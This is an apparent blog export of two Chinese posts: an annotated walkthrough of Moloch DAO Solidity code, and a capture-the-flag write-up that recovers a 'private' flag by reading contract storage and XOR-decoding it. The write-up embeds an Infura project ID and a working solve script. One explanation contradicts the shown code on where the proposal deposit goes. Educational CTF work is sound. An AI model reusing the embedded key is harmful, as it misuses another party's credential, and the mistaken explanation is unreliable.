proposal.maxTotalSharesAtYesVote) &#123;\n            didPass = false;\n        &#125;\n        // PROPOSAL PASSED\n        if (didPass &amp;&amp; !proposal.aborted) &#123;\n            proposal.didPass = true;\n            // if the applicant is already a member, add to their existing shares\n            if (members[proposal.applicant].exists) &#123;\n                members[proposal.applicant].shares = members[proposal.applicant].shares.add(proposal.sharesRequested);\n            // the applicant is a new member, create a new record for them\n            &#125; else &#123;\n                // if the applicant address is already taken by a member's delegateKey, reset it to their member address\n                if (members[memberAddressByDelegateKey[proposal.applicant]].exists) &#123;\n                    address memberToOverride = memberAddressByDelegateKey[proposal.applicant];\n                    memberAddressByDelegateKey[memberToOverride] = memberToOverride;\n                    members[memberToOverride].delegateKey = memberToOverride;\n                &#125;\n                // use applicant address as delegateKey by default\n                members[proposal.applicant] = Member(proposal.applicant, proposal.sharesRequested, true, 0);\n                memberAddressByDelegateKey[proposal.applicant] = proposal.applicant;\n            &#125;\n            // mint new shares\n            totalShares = totalShares.add(proposal.sharesRequested);\n            // transfer tokens to guild bank\n            require(\n                approvedToken.transfer(address(guildBank), proposal.tokenTribute),\n                \"Moloch::processProposal - token transfer to guild bank failed\"\n            );\n        // PROPOSAL FAILED OR ABORTED\n        &#125; else &#123;\n            // return all tokens to the applicant\n            require(\n                approvedToken.transfer(proposal.applicant, proposal.tokenTribute),\n                \"Moloch::processProposal - failing vote token transfer failed\"\n            );\n        &#125;\n        // send msg.sender the processingReward\n        require(\n            approvedToken.transfer(msg.sender, processingReward),\n            \"Moloch::processProposal - failed to send processing reward to msg.sender\"\n        );\n        // return deposit to proposer (subtract processing reward)\n        require(\n            approvedToken.transfer(proposal.proposer, proposalDeposit.sub(processingReward)),\n            \"Moloch::processProposal - failed to return proposal deposit to proposer\"\n        );\n        emit ProcessProposal(\n            proposalIndex,\n            proposal.applicant,\n            proposal.proposer,\n            proposal.tokenTribute,\n            proposal.sharesRequested,\n            didPass\n        );\n    &#125;\n\n    function ragequit(uint256 sharesToBurn) public onlyMember &#123;\n        uint256 initialTotalShares = totalShares;\n\n        Member storage member = members[msg.sender];\n\n        require(member.shares >= sharesToBurn, \"Moloch::ragequit - insufficient shares\");\n\n        require(canRagequit(member.highestIndexYesVote), \"Moloch::ragequit - cant ragequit until highest index proposal member voted YES on is processed\");\n\n        // burn shares\n        member.shares = member.shares.sub(sharesToBurn);\n        totalShares = totalShares.sub(sharesToBurn);\n\n        // instruct guildBank to transfer fair share of tokens to the ragequitter\n        require(\n            guildBank.withdraw(msg.sender, sharesToBurn, initialTotalShares),\n            \"Moloch::ragequit - withdrawal of tokens from guildBank failed\"\n        );\n\n        emit Ragequit(msg.sender, sharesToBurn);\n    &#125;\n\n    function abort(uint256 proposalIndex) public &#123;\n        require(proposalIndex &lt; proposalQueue.length, \"Moloch::abort - proposal does not exist\");\n        Proposal storage proposal = proposalQueue[proposalIndex];\n\n        require(msg.sender == proposal.applicant, \"Moloch::abort - msg.sender must be applicant\");\n        require(getCurrentPeriod() &lt; proposal.startingPeriod.add(abortWindow), \"Moloch::abort - abort window must not have passed\");\n        require(!proposal.aborted, \"Moloch::abort - proposal must not have already been aborted\");\n\n        uint256 tokensToAbort = proposal.tokenTribute;\n        proposal.tokenTribute = 0;\n        proposal.aborted = true;\n\n        // return all tokens to the applicant\n        require(\n            approvedToken.transfer(proposal.applicant, tokensToAbort),\n            \"Moloch::processProposal - failed to return tribute to applicant\"\n        );\n\n        emit Abort(proposalIndex, msg.sender);\n    &#125;\n\n    function updateDelegateKey(address newDelegateKey) public onlyMember &#123;\n        require(newDelegateKey != address(0), \"Moloch::updateDelegateKey - newDelegateKey cannot be 0\");\n\n        // skip checks if member is setting the delegate key to their member address\n        if (newDelegateKey != msg.sender) &#123;\n            require(!members[newDelegateKey].exists, \"Moloch::updateDelegateKey - cant overwrite existing members\");\n            require(!members[memberAddressByDelegateKey[newDelegateKey]].exists, \"Moloch::updateDelegateKey - cant overwrite existing delegate keys\");\n        &#125;\n\n        Member storage member = members[msg.sender];\n        memberAddressByDelegateKey[member.delegateKey] = address(0);\n        memberAddressByDelegateKey[newDelegateKey] = msg.sender;\n        member.delegateKey = newDelegateKey;\n\n        emit UpdateDelegateKey(msg.sender, newDelegateKey);\n    &#125;\n\n    /***************\n    GETTER FUNCTIONS\n    ***************/\n\n    function max(uint256 x, uint256 y) internal pure returns (uint256) &#123;\n        return x >= y ? x : y;\n    &#125;\n\n    function getCurrentPeriod() public view returns (uint256) &#123;\n        return now.sub(summoningTime).div(periodDuration);\n    &#125;\n\n    function getProposalQueueLength() public view returns (uint256) &#123;\n        return proposalQueue.length;\n    &#125;\n\n    // can only ragequit if the latest proposal you voted YES on has been processed\n    function canRagequit(uint256 highestIndexYesVote) public view returns (bool) &#123;\n        require(highestIndexYesVote &lt; proposalQueue.length, \"Moloch::canRagequit - proposal does not exist\");\n        return proposalQueue[highestIndexYesVote].processed;\n    &#125;\n\n    function hasVotingPeriodExpired(uint256 startingPeriod) public view returns (bool) &#123;\n        return getCurrentPeriod() >= startingPeriod.add(votingPeriodLength);\n    &#125;\n\n    function getMemberProposalVote(address memberAddress, uint256 proposalIndex) public view returns (Vote) &#123;\n        require(members[memberAddress].exists, \"Moloch::getMemberProposalVote - member doesn't exist\");\n        require(proposalIndex &lt; proposalQueue.length, \"Moloch::getMemberProposalVote - proposal doesn't exist\");\n        return proposalQueue[proposalIndex].votesByMember[memberAddress];\n    &#125;\n&#125;\n\ninterface IERC20 &#123;\n    function transfer(address to, uint256 value) external returns (bool);\n\n    function approve(address spender, uint256 value) external returns (bool);\n\n    function transferFrom(address from, address to, uint256 value) external returns (bool);\n\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address who) external view returns (uint256);\n\n    function allowance(address owner, address spender) external view returns (uint256);\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n&#125;\n\ncontract Ownable &#123;\n    address private _owner;\n\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n\n    /**\n     * @dev The Ownable constructor sets the original `owner` of the contract to the sender\n     * account.\n     */\n    constructor () internal &#123;\n        _owner = msg.sender;\n        emit OwnershipTransferred(address(0), _owner);\n    &#125;\n\n    /**\n     * @return the address of the owner.\n     */\n    function owner() public view returns (address) &#123;\n        return _owner;\n    &#125;\n\n    /**\n     * @dev Throws if called by any account other than the owner.\n     */\n    modifier onlyOwner() &#123;\n        require(isOwner());\n        _;\n    &#125;\n\n    /**\n     * @return true if `msg.sender` is the owner of the contract.\n     */\n    function isOwner() public view returns (bool) &#123;\n        return msg.sender == _owner;\n    &#125;\n\n    /**\n     * @dev Allows the current owner to relinquish control of the contract.\n     * @notice Renouncing to ownership will leave the contract without an owner.\n     * It will not be possible to call the functions with the `onlyOwner`\n     * modifier anymore.\n     */\n    function renounceOwnership() public onlyOwner &#123;\n        emit OwnershipTransferred(_owner, address(0));\n        _owner = address(0);\n    &#125;\n\n    /**\n     * @dev Allows the current owner to transfer control of the contract to a newOwner.\n     * @param newOwner The address to transfer ownership to.\n     */\n    function transferOwnership(address newOwner) public onlyOwner &#123;\n        _transferOwnership(newOwner);\n    &#125;\n\n    /**\n     * @dev Transfers control of the contract to a newOwner.\n     * @param newOwner The address to transfer ownership to.\n     */\n    function _transferOwnership(address newOwner) internal &#123;\n        require(newOwner != address(0));\n        emit OwnershipTransferred(_owner, newOwner);\n        _owner = newOwner;\n    &#125;\n&#125;\n\ncontract GuildBank is Ownable &#123;\n    using SafeMath for uint256;\n\n    IERC20 public approvedToken; // approved token contract reference\n\n    event Withdrawal(address indexed receiver, uint256 amount);\n\n    constructor(address approvedTokenAddress) public &#123;\n        approvedToken = IERC20(approvedTokenAddress);\n    &#125;\n\n    function withdraw(address receiver, uint256 shares, uint256 totalShares) public onlyOwner returns (bool) &#123;\n        uint256 amount = approvedToken.balanceOf(address(this)).mul(shares).div(totalShares);\n        emit Withdrawal(receiver, amount);\n        return approvedToken.transfer(receiver, amount);\n    &#125;\n&#125;\n\nlibrary SafeMath &#123;\n    /**\n     * @dev Multiplies two unsigned integers, reverts on overflow.\n     */\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) &#123;\n        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the\n        // benefit is lost if 'b' is also tested.\n        // See: https://github.com/OpenZeppelin/openzeppelin-solidity/pull/522\n        if (a == 0) &#123;\n            return 0;\n        &#125;\n\n        uint256 c = a * b;\n        require(c / a == b);\n\n        return c;\n    &#125;\n\n    /**\n     * @dev Integer division of two unsigned integers truncating the quotient, reverts on division by zero.\n     */\n    function div(uint256 a, uint256 b) internal pure returns (uint256) &#123;\n        // Solidity only automatically asserts when dividing by 0\n        require(b > 0);\n        uint256 c = a / b;\n        // assert(a == b * c + a % b); // There is no case in which this doesn't hold\n\n        return c;\n    &#125;\n\n    /**\n     * @dev Subtracts two unsigned integers, reverts on overflow (i.e. if subtrahend is greater than minuend).\n     */\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) &#123;\n        require(b &lt;= a);\n        uint256 c = a - b;\n\n        return c;\n    &#125;\n\n    /**\n     * @dev Adds two unsigned integers, reverts on overflow.\n     */\n    function add(uint256 a, uint256 b) internal pure returns (uint256) &#123;\n        uint256 c = a + b;\n        require(c >= a);\n\n        return c;\n    &#125;\n\n    /**\n     * @dev Divides two unsigned integers and returns the remainder (unsigned integer modulo),\n     * reverts when dividing by zero.\n     */\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) &#123;\n        require(b != 0);\n        return a % b;\n    &#125;\n&#125;\n\nAnalyze变量注解periodDuration：默认值为4.8 hours\nvotingPeriodLengthL：投票进行期限，默认为7 days\ngracePeriodLength：宽限期限，默认为7 days\nabortWindow：再star后的abortWindow时间内可以进行中止操作\nproposalDeposit：每提交一份提案就要像dao合约地址存入proposalDeposit，默认值为10ETH。\ndilutionBound：maxTotalSharesAtYesVote不能大于totalshares*dilutionBound，否则视为不通过，默认值为3\nprocessingReward：给处理提案人的奖励，默认值为0.1ETH\nsummoningTime：部署时的时间\n函数解析前段时间只有summoner满足onlydelegate条件，只有投票通过后才能成为member并将applicant添加到memberAddressByDelegateKey[proposal.applicant]同时将sharequest添加到member中去，才可以满足onlydelegate条件，所以前几个提案的只有一票（summoner的share只有1）。\nfunction submitProposal(\n    address applicant,\n    uint256 tokenTribute,\n    uint256 sharesRequested,\n    string memory details\n)\n    public\n    onlyDelegate\n&#123;\n    require(applicant != address(0), \"Moloch::submitProposal - applicant cannot be 0\");\n\n    // Make sure we won't run into overflows when doing calculations with shares.\n    // Note that totalShares + totalSharesRequested + sharesRequested is an upper bound\n    // on the number of shares that can exist until this proposal has been processed.\n    require(totalShares.add(totalSharesRequested).add(sharesRequested) &lt;= MAX_NUMBER_OF_SHARES, \"Moloch::submitProposal - too many shares requested\");\n\n    totalSharesRequested = totalSharesRequested.add(sharesRequested);\n\n    address memberAddress = memberAddressByDelegateKey[msg.sender];\n\n    // collect proposal deposit from proposer and store it in the Moloch until the proposal is processed\n    require(approvedToken.transferFrom(msg.sender, address(this), proposalDeposit), \"Moloch::submitProposal - proposal deposit token transfer failed\");\n\n    // collect tribute from applicant and store it in the Moloch until the proposal is processed\n    require(approvedToken.transferFrom(applicant, address(this), tokenTribute), \"Moloch::submitProposal - tribute token transfer failed\");\n\n    // compute startingPeriod for proposal\n    uint256 startingPeriod = max(\n        getCurrentPeriod(),\n        proposalQueue.length == 0 ? 0 : proposalQueue[proposalQueue.length.sub(1)].startingPeriod\n    ).add(1);\n\n    // create proposal ...\n    Proposal memory proposal = Proposal(&#123;\n        proposer: memberAddress,\n        applicant: applicant,\n        sharesRequested: sharesRequested,\n        startingPeriod: startingPeriod,\n        yesVotes: 0,\n        noVotes: 0,\n        processed: false,\n        didPass: false,\n        aborted: false,\n        tokenTribute: tokenTribute,\n        details: details,\n        maxTotalSharesAtYesVote: 0\n    &#125;);\n\n    // ... and append it to the queue\n    proposalQueue.push(proposal);\n\n    uint256 proposalIndex = proposalQueue.length.sub(1);\n    emit SubmitProposal(proposalIndex, msg.sender, memberAddress, applicant, tokenTribute, sharesRequested);\n&#125;\n\n\nsubmitProposal函数用于提交一个提案，只能是delegate\n首先判断申请人是否为非零地址，再判断在总共股权加上总共的请求股权是否会超出最大值MAX_NUMBER_OF_SHARES，之后会从msg.sender向合约地址转账10ETH，并且从申请人向合约地址转账tokenTribute。\n起始期就是CurrentPeriod+1，然后将新的proposal添加到proposalQueue数组中去。\n之后进行投票，投票通过，applicant将会成为member\nfunction submitVote(uint256 proposalIndex, uint8 uintVote) public onlyDelegate &#123;\n    address memberAddress = memberAddressByDelegateKey[msg.sender];\n    Member storage member = members[memberAddress];\n\n    require(proposalIndex &lt; proposalQueue.length, \"Moloch::submitVote - proposal does not exist\");\n    Proposal storage proposal = proposalQueue[proposalIndex];\n\n    require(uintVote &lt; 3, \"Moloch::submitVote - uintVote must be less than 3\");\n    Vote vote = Vote(uintVote);\n\n    require(getCurrentPeriod() >= proposal.startingPeriod, \"Moloch::submitVote - voting period has not started\");\n    require(!hasVotingPeriodExpired(proposal.startingPeriod), \"Moloch::submitVote - proposal voting period has expired\");\n    require(proposal.votesByMember[memberAddress] == Vote.Null, \"Moloch::submitVote - member has already voted on this proposal\");\n    require(vote == Vote.Yes || vote == Vote.No, \"Moloch::submitVote - vote must be either Yes or No\");\n    require(!proposal.aborted, \"Moloch::submitVote - proposal has been aborted\");\n\n    // store vote\n    proposal.votesByMember[memberAddress] = vote;\n\n    // count vote\n    if (vote == Vote.Yes) &#123;\n        proposal.yesVotes = proposal.yesVotes.add(member.shares);\n\n        // set highest index (latest) yes vote - must be processed for member to ragequit\n        if (proposalIndex > member.highestIndexYesVote) &#123;\n            member.highestIndexYesVote = proposalIndex;\n        &#125;\n\n        // set maximum of total shares encountered at a yes vote - used to bound dilution for yes voters\n        if (totalShares > proposal.maxTotalSharesAtYesVote) &#123;\n            proposal.maxTotalSharesAtYesVote = totalShares;\n        &#125;\n\n    &#125; else if (vote == Vote.No) &#123;\n        proposal.noVotes = proposal.noVotes.add(member.shares);\n    &#125;\n\n    emit SubmitVote(proposalIndex, msg.sender, memberAddress, uintVote);\n&#125;\n\n\n对应两个参数分别是提案编号以及所投的票类型（弃权，同意，否定），同时记录用户所投的票种\n如果为YES票，提案的YesVote将会加上member的所有股权，同时记录最近一次投yes票的提案编号（此次）\n如果为No票，提案的NoVote将会加上member的所有股权\n之后进入第三轮，处理提案\nfunction processProposal(uint256 proposalIndex) public &#123;\n    require(proposalIndex &lt; proposalQueue.length, \"Moloch::processProposal - proposal does not exist\");\n    Proposal storage proposal = proposalQueue[proposalIndex];\n    require(getCurrentPeriod() >= proposal.startingPeriod.add(votingPeriodLength).add(gracePeriodLength), \"Moloch::processProposal - proposal is not ready to be processed\");\n    require(proposal.processed == false, \"Moloch::processProposal - proposal has already been processed\");\n    require(proposalIndex == 0 || proposalQueue[proposalIndex.sub(1)].processed, \"Moloch::processProposal - previous proposal must be processed\");\n    proposal.processed = true;\n    totalSharesRequested = totalSharesRequested.sub(proposal.sharesRequested);\n    bool didPass = proposal.yesVotes > proposal.noVotes;\n    // Make the proposal fail if the dilutionBound is exceeded\n    if (totalShares.mul(dilutionBound) &lt; proposal.maxTotalSharesAtYesVote) &#123;\n        didPass = false;\n    &#125;\n    // PROPOSAL PASSED\n    if (didPass &amp;&amp; !proposal.aborted) &#123;\n        proposal.didPass = true;\n        // if the applicant is already a member, add to their existing shares\n        if (members[proposal.applicant].exists) &#123;\n            members[proposal.applicant].shares = members[proposal.applicant].shares.add(proposal.sharesRequested);\n        // the applicant is a new member, create a new record for them\n        &#125; else &#123;\n            // if the applicant address is already taken by a member's delegateKey, reset it to their member address\n            if (members[memberAddressByDelegateKey[proposal.applicant]].exists) &#123;\n                address memberToOverride = memberAddressByDelegateKey[proposal.applicant];\n                memberAddressByDelegateKey[memberToOverride] = memberToOverride;\n                members[memberToOverride].delegateKey = memberToOverride;\n            &#125;\n            // use applicant address as delegateKey by default\n            members[proposal.applicant] = Member(proposal.applicant, proposal.sharesRequested, true, 0);\n            memberAddressByDelegateKey[proposal.applicant] = proposal.applicant;\n        &#125;\n        // mint new shares\n        totalShares = totalShares.add(proposal.sharesRequested);\n        // transfer tokens to guild bank\n        require(\n            approvedToken.transfer(address(guildBank), proposal.tokenTribute),\n            \"Moloch::processProposal - token transfer to guild bank failed\"\n        );\n    // PROPOSAL FAILED OR ABORTED\n    &#125; else &#123;\n        // return all tokens to the applicant\n        require(\n            approvedToken.transfer(proposal.applicant, proposal.tokenTribute),\n            \"Moloch::processProposal - failing vote token transfer failed\"\n        );\n    &#125;\n    // send msg.sender the processingReward\n    require(\n        approvedToken.transfer(msg.sender, processingReward),\n        \"Moloch::processProposal - failed to send processing reward to msg.sender\"\n    );\n    // return deposit to proposer (subtract processing reward)\n    require(\n        approvedToken.transfer(proposal.proposer, proposalDeposit.sub(processingReward)),\n        \"Moloch::processProposal - failed to return proposal deposit to proposer\"\n    );\n    emit ProcessProposal(\n        proposalIndex,\n        proposal.applicant,\n        proposal.proposer,\n        proposal.tokenTribute,\n        proposal.sharesRequested,\n        didPass\n    );\n&#125;\n\n任何人都可以处理，参数为所要处理的提案的编号，参数有所限制，此编号对应的上一个提案必须已被处理，要求当前时间大于开始时间+投票期限+宽限期限，只要提案的同意票数大于否定票数即视为通过\ncase0 false将申请者的tokenTribute原路退回\ncase1 true通过后如果申请人已经是member，则直接将申请人的股权加上申请的股权，否则如果申请者地址已经被成员的delegateKey占用，则将其重置为成员地址。之后铸造新的股权，并将tokenTribute转入guildbank\n最后，将会给处理提案的人processingReward数量的奖励，剩余的proposalDeposit发送给applicant。\nmolochDAO的特色功能—-怒退\nfunction ragequit(uint256 sharesToBurn) public onlyMember &#123;\n    uint256 initialTotalShares = totalShares;\n\n    Member storage member = members[msg.sender];\n\n    require(member.shares >= sharesToBurn, \"Moloch::ragequit - insufficient shares\");\n\n    require(canRagequit(member.highestIndexYesVote), \"Moloch::ragequit - cant ragequit until highest index proposal member voted YES on is processed\");\n\n    // burn shares\n    member.shares = member.shares.sub(sharesToBurn);\n    totalShares = totalShares.sub(sharesToBurn);\n\n    // instruct guildBank to transfer fair share of tokens to the ragequitter\n    require(\n        guildBank.withdraw(msg.sender, sharesToBurn, initialTotalShares),\n        \"Moloch::ragequit - withdrawal of tokens from guildBank failed\"\n    );\n\n    emit Ragequit(msg.sender, sharesToBurn);\n&#125;\n\n首先检测是否满足可以ragequit的条件，满足则燃烧部分股权取回资产\nfunction abort(uint256 proposalIndex) public &#123;\n    require(proposalIndex &lt; proposalQueue.length, \"Moloch::abort - proposal does not exist\");\n    Proposal storage proposal = proposalQueue[proposalIndex];\n\n    require(msg.sender == proposal.applicant, \"Moloch::abort - msg.sender must be applicant\");\n    require(getCurrentPeriod() &lt; proposal.startingPeriod.add(abortWindow), \"Moloch::abort - abort window must not have passed\");\n    require(!proposal.aborted, \"Moloch::abort - proposal must not have already been aborted\");\n\n    uint256 tokensToAbort = proposal.tokenTribute;\n    proposal.tokenTribute = 0;\n    proposal.aborted = true;\n\n    // return all tokens to the applicant\n    require(\n        approvedToken.transfer(proposal.applicant, tokensToAbort),\n        \"Moloch::processProposal - failed to return tribute to applicant\"\n    );\n\n    emit Abort(proposalIndex, msg.sender);\n&#125;\n\n终止函数，终止指定编号的提案，只有applicant可执行此操作，同时返还所有tribute\nfunction updateDelegateKey(address newDelegateKey) public onlyMember &#123;\n    require(newDelegateKey != address(0), \"Moloch::updateDelegateKey - newDelegateKey cannot be 0\");\n\n    // skip checks if member is setting the delegate key to their member address\n    if (newDelegateKey != msg.sender) &#123;\n        require(!members[newDelegateKey].exists, \"Moloch::updateDelegateKey - cant overwrite existing members\");\n        require(!members[memberAddressByDelegateKey[newDelegateKey]].exists, \"Moloch::updateDelegateKey - cant overwrite existing delegate keys\");\n    &#125;\n\n    Member storage member = members[msg.sender];\n    memberAddressByDelegateKey[member.delegateKey] = address(0);\n    memberAddressByDelegateKey[newDelegateKey] = msg.sender;\n    member.delegateKey = newDelegateKey;\n\n    emit UpdateDelegateKey(msg.sender, newDelegateKey);\n&#125;\n\n更新delegatekey，只有member可以操作。\n","slug":"one-example-to-know-DAO","date":"2022-08-01T10:30:36.709Z","categories_index":"","tags_index":"区块链","author_index":"bcYng"},{"id":"ec8400bf6f96d412e898d5ce3ea11cc4","title":"A ctf challenge about variable storage","content":"关于这个挑战的Write up！\nCode//SPDX-License-Identifier: Unlicense\npragma solidity ^0.8.9;\n\n\ncontract Chal &#123;\n    string private flag;\n    address public owner = msg.sender;\n\n    constructor(string memory _flag) &#123;\n        flag = _flag;\n    &#125;\n\n    function random() private view returns (uint) &#123;\n        return uint(keccak256(abi.encodePacked(block.difficulty, block.timestamp, msg.sender)));        \n    &#125;\n\n    function query() public payable returns (bytes1) &#123;\n        require(msg.value >= 15 ether);\n        bytes memory _flag = bytes(flag);\n        bytes1 idx = bytes1(uint8(random() % _flag.length));\n        return _flag[uint8(idx)] ^ idx;\n    &#125;\n\n    function withdraw(address payable to) public &#123;\n        require (msg.sender == owner);\n        to.transfer(address(this).balance);\n    &#125;\n&#125;\n\n题目要求获得flag\n题目合约创建详情：https://ropsten.etherscan.io/tx/0x1b8069c52d74ef0aa7c4692b5a7d77f2f1cafc0ad53d3b238748239645edbf03\nflag GoN{…}\nFirst Analyze题目可见string存储在slot0的位置，通过web3.py可以查询到该插槽内存储的内容从而直接获得flag，这里涉及到了关于solidity存储字符串类型数据的问题。\n字符串数据类型存储分为两个情况，首先要了解到，每个字母占2个十六进制位，每个汉字占6个十六进制位 \ncase1\n十六进制位小于64位，直接存储在对应插槽\ncase2\n十六进制位大于64位，存储方式类似数组，对应插槽存储长度，实际内容存储在keccak256(x)，x&#x3D;slot(string)，该题对应的x为0\n脚本获得字符串长度为0x53大于64位，所以对应case2\nFirst tryfrom web3 import Web3,HTTPProvider\nw3=Web3(HTTPProvider('https://ropsten.infura.io/v3/071f682145af4cfc9f0b92a497e89431'))\nprint(w3.eth.getStorageAt(address,0))\na=w3.eth.getStorageAt(address,Web3.sha3(0))\nb=w3.eth.getStorageAt(address,Web3.sha3(0)+1)\nprint(a+b)\n\n获得如下字符串\nGnLxqvoioVhgcnelxp{}KayHs|\\x7fkCy\\x7fkA~RVFIODU\n所得flag为乱码还包含不可见字符，证明存在问题\n尝试使用凯撒密码和维吉尼亚密码的解密方式无法获得flag，回归solidity代码继续分析\nSecond Analyze关注代码中的query()部分\nfunction query() public payable returns (bytes1) &#123;\n        require(msg.value >= 15 ether);\n        bytes memory _flag = bytes(flag);\n        bytes1 idx = bytes1(uint8(random() % _flag.length));\n        return _flag[uint8(idx)] ^ idx;\n    &#125;\n\n对该函数进行分析由于require要求调用一次需要15eth并且random不确定，从而打消了直接调用获得并拼接获得flag的想法\n但是该函数有一点值得注意的是return处_flag[uint8(idx)] ^ idx其中是bytes类型的 _flag的第idx位与idx进行异或运算(1对1为0，0对0为0，1对0为1，0对1为1)虽然随机数random不可控，但是我们可以自行构建脚本，实现idx可控从而不使用合约中的函数并按照题目方法进行计算并拼接即可\nFinal Tryfrom Crypto.Util.number import *\n\n\nstr=\"476e4c7871766f696f566867636e656c78707b7d4b617948737c7f6b43797f6b417e525646494f4455\"\nflag=''\nj=0\nfor i in range(len(str)-1):\n    if i%2==0:\n        _str=int(str[i:i+2],16)\n        flag+=(hex(_str^j))[2:]\n        j+=1\na=int(flag,16)\nprint(long_to_bytes(a))//题目中bytes1类型是在每两位进行异或\n\n运行脚本得到flag：GoN{using_blockchain_to_keep_data_public}\nSummary在遇到相似的顺序类加密问题时，首先考虑凯撒密码和维吉尼亚密码，如果这两种方法解密失败那就要回过头去寻找题目给出的信息，hint也好还是题目代码也好，一定是有所遗漏，回归代码仔细审计，得到解决方案。\n","slug":"gonctf","date":"2022-07-05T00:45:24.373Z","categories_index":"","tags_index":"区块链 ctf","author_index":"bcYng"}]